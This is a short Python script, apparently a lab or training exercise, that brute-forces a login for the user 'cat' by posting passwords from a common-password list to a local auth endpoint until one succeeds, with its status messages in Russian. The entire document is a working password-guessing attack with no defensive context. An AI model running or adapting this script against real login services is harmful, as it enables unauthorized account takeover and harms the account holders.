import requests

state = -1

with open('pop-passwords.txt') as passwords_file:
    passwords = [password.strip() for password in passwords_file.readlines()]


def next_password():
    global state
    state += 1
    return passwords[state]


login = 'cat'
password = ''

while True:
    data = {'login': login, 'password': password}
    response = requests.post('http://127.0.0.1:4000/auth', json=data)
    if response.status_code == 200:
        print(f'{login=} {password=} ПОЛУЧИЛОСЬ!!!')
        break
    else:
        print(f'{login=} {password=} не подошел')

    password = next_password()
